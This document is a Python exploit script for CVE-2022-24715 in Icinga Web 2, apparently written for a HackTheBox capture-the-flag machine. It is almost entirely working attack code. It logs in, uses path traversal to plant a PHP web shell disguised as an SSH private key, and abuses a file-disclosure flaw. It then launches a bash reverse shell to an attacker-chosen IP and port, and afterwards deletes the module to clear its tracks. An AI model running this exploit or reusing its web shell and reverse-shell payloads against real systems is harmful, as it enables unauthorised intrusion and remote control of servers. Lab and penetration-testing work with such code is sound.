#!/usr/bin/env python3

"""
Cerberus HTB (CVE-2022-24715)
-----------------------------
Author: Marss
Date: 11 Aug, 2023
"""

from argparse import ArgumentParser, RawDescriptionHelpFormatter
from random import choices
from re import findall
from requests import Session, get, post
from requests.exceptions import ConnectionError, ConnectTimeout
from signal import signal, SIGINT
from string import ascii_letters
from sys import argv

# debugging
import pdb

# Ctrl + C
signal(SIGINT, lambda signum, frame: exit('\n[!] User aborted.'))

# Main class
class Exploit:
    
    get_rand_str = lambda self, length: ''.join(choices(ascii_letters, k=length))

    def __init__(self, args):

        self.target = {
            'base_url': args.target + '/icingaweb2',
            'cmd': f"bash -c 'bash -i >%26 /dev/tcp/{args.ip}/{args.port} 0>%261'",
            'user': args.username,
            'pass': args.password,
            'csrf_token': None,
            'pem': args.key,
            'module_name': self.get_rand_str(5),
            'module_payload': None
        }

        self.web_shell: str = f"<?php system($_GET['{self.target['module_name']}']); ?>"
        self.null_byte: str = "\x00"

        self.icinga_default_conf = {
            'global_show_stacktraces': 1,
            'global_show_application_state_messages': 1,
            'global_module_path': '/usr/share/icingaweb2/modules/',
            'global_config_resource': 'icingaweb2',
            'logging_log': 'syslog',
            'logging_level': 'ERROR',
            'logging_application': 'icingaweb2',
            'logging_facility': 'user',
            'themes_default': 'Icinga',
            'themes_disabled': 0,
            'authentication_default_domain': '',
            'formUID': 'form_config_general',
            'CSRFToken': self.target['csrf_token'],
            'btn_submit': 'Save Changes'
        }

        self.session = Session()

        # proxies
        #self.proxies = {'http':'127.1:8080'}
        #self.session.proxies.update(self.proxies)
        
    def run(self):
        
        try:
            if self.target_response() and self.login_success():
                    # Uploading and configuring the module
                    self.generate_payload()
                    self.upload_module()
                    self.validate_uploaded_module()
                    self.update_module_path()
                    self.module_action(mode='enable')
                    # Remote Code Execution
                    self.command_execution(self.target['cmd'])
                    # Clear tracks
                    self.module_action(mode='disable')  
                    self.remove_module()
                    self.update_default_module_config()               

        except Exception as error:
            exit('\n[x] Error: ' + repr(error))

    def target_response(self) -> bool:

        try:
            response = self.session.get(self.target['base_url'], timeout=5)
            
            if response.status_code == 200:
                print('\n[+] Successful connection with {}'.format(self.target['base_url']))
                return True

        except ConnectionError:
            exit('\n[!] Verify connection with the target or resolve the specific domain on your local DNS server (/etc/hosts)')

    def save_csrf_token(self, url_path: str):
        
        response = self.session.get(self.target['base_url'] + url_path)

        token = findall(r'name="CSRFToken" value="(.*?)"', response.text)[0]
        self.target['csrf_token'] = token
        
    def login_success(self) -> bool:
        
        self.save_csrf_token('/authentication/login')

        post_data = {
            'username': self.target['user'],
            'password': self.target['pass'],
            'formUID': 'form_login',
            'CSRFToken': self.target['csrf_token'],
            'btn_submit': 'Login'
        }

        response = self.session.post(self.target['base_url'] + '/authentication/login',
            data=post_data
        )
        
        if not '/icingaweb2/dashboard' in response.url:
            exit('[x] Invalid credentials')
        
        print('[+] Valid credentials')
        return True

    def read_certificate(self) -> str:

        with open(self.target['pem'], 'r') as file:
            return file.read()
    
    def generate_payload(self):

        pem_content = self.read_certificate()
        self.target['module_payload'] = pem_content + self.null_byte + self.web_shell

    def upload_module(self):

        self.save_csrf_token('/config/createresource')
        
        name = self.target['module_name']
        post_data = {
            'type': 'ssh',
            'name': name,
            'user': 11*'../' + f'dev/shm/{name}/run.php', # /dev/shm is a temporary file storage filesystem
            'private_key': self.target['module_payload'],
            'formUID': 'form_config_resource',
            'CSRFToken': self.target['csrf_token'],
            'btn_submit': 'Save Changes'
        }

        response = self.session.post(self.target['base_url'] + '/config/createresource',
            data=post_data
        )

    def module_action(self, mode: str):

        mode_path = f'/config/module{mode}'
        
        self.save_csrf_token(mode_path)

        post_data = {
            'identifier': self.target['module_name'],
            'CSRFToken': self.target['csrf_token'],
            'btn_submit': 'btn_submit'
        }

        response = self.session.post(self.target['base_url'] + mode_path,
            data=post_data
        )
        
        if response.status_code != 200:
            exit('[x] Module operation failed')
        elif 'Could not disable module' in response.text:
            print(f'[+] Failed to disable module')
        else:
            print(f'[+] Module {mode}')

    def validate_uploaded_module(self):

        # CVE-2022-24716 (File disclosure)
        vulnerable_path = '/lib/icinga/icinga-php-thirdparty'
        module = f"/{self.target['module_name']}/run.php"
        
        response = self.session.get(self.target['base_url'] + vulnerable_path + '/dev/shm' + module)
        
        if response.status_code != 200:
            exit('[x] Error loading module')

        print('[+] The module was created successfully')

    def update_module_path(self):
        
        self.save_csrf_token('/config/general')
        
        post_data = {
            'global_show_stacktraces': 1,
            'global_show_application_state_messages': 1,
            'global_module_path': '/dev/shm/', # path declared in upload_module function
            'global_config_resource': 'icingaweb2',
            'logging_log': 'none',
            'themes_default': 'Icinga',
            'themes_disabled': 0,
            'authentication_default_domain': '',
            'formUID': 'form_config_general',
            'CSRFToken': self.target['csrf_token'],
            'btn_submit': 'Save Changes'
        }

        response = self.session.post(self.target['base_url'] + '/config/general',
            data=post_data
        )

        if response.status_code != 200:
            exit('[x] Module configuration failed')

        print('[+] Updated global configuration of modules')

    def command_execution(self, command: str):

        try:
        # curl -s http://<icingab2_base_url>/dashboard?DgBuE=<command>
            response = self.session.get(self.target['base_url'] + f"/dashboard?{self.target['module_name']}={command}",
            timeout=3
            )
        except ConnectTimeout:
            print('[+] Reverse shell executed')
            pass

    def remove_module(self):
        # Delete module payload file
        self.command_execution('rm -rf /dev/shm/{}'.format(self.target['module_name']))

        # Delete module web resource
        self.save_csrf_token('/config/removeresource?resource={}'.format(self.target['module_name']))

        post_data = {
            'formUID': 'form_confirm_removal',
            'CSRFToken': self.target['csrf_token'],
            'btn_submit': 'Confirm Removal'
        }

        response = self.session.post(self.target['base_url'] + '/config/removeresource?resource={}'.format(self.target['module_name']),
            data=post_data,
            allow_redirects=False
        )

        if response.status_code != 302:
            exit('[x] Failed to remove module')

        print('[+] Module removed')

    def update_default_module_config(self):

        self.save_csrf_token('/config/general')
        
        response = self.session.post(self.target['base_url'] + '/config/general',
            data=self.icinga_default_conf
        )

        if response.status_code != 200:
            exit('[x] Module configuration reset failed')

        print('[+] Updated default configuration of modules')

# Main Flow
if __name__ == '__main__':

    title = '| CVE-2022-24715 |'

    parser = ArgumentParser(
        formatter_class=RawDescriptionHelpFormatter,
        epilog=f'''\nExample:
        python3 {argv[0]} -t http://icinga.cerberus.local:8080 i 10.10.10.10 -P 4444 -u icinga -p icinga123 -k key.pem
        '''
    )

    parser.add_argument('-t', '--target', type=str, required=True, help='Vulnerable target domain')
    parser.add_argument('-i', '--ip', type=str, required=True, help='IP to receive shell')
    parser.add_argument('-P', '--port', type=str, required=True, help='PORT to receive shell')
    parser.add_argument('-u', '--username', type=str, required=True, help='Icinga login user')
    parser.add_argument('-p', '--password', type=str, required=True, help='Icinga login password')
    parser.add_argument('-k', '--key', type=str, required=True, help='Valid PEM key generated: ssh-keygen -m pem -f "./key.pem" -P "" (without passphrase)')

    args = parser.parse_args()

    print(title)

    exploit = Exploit(args)
    exploit.run()